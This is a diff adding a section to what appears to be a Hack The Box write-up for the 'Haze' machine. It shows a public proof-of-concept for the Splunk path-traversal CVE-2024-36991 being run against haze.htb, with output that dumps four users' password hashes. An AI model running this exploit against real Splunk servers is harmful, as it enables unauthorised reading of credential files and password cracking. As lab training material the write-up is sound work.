@@ -183,5 +183,28 @@ CVE-2024-36991?
 https://github.com/bigb0x/CVE-2024-36991/blob/main/CVE-2024-36991.py
 
 ```python
+python3 CVE-2024-36991.py -u http://haze.htb:8000/     
+/home/kali/htb/haze/CVE-2024-36991/CVE-2024-36991.py:55: SyntaxWarning: invalid escape sequence '\ '
+  LOG_DIR = 'logs'
 
+                                                                        
+  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _ 
+ / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |
+| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| '_ | (_) | (_) | |
+| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |
+ \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|
+                                                                           
+-> POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file. 
+-> By x.com/MohamedNab1l
+-> Use Wisely.
+
+[INFO] Log directory created: logs
+[INFO] Testing single target: http://haze.htb:8000/
+[VLUN] Vulnerable: http://haze.htb:8000/
+:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
+:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
+:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
+:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
 ```
+This looks like its dumped hashes for four users!
+
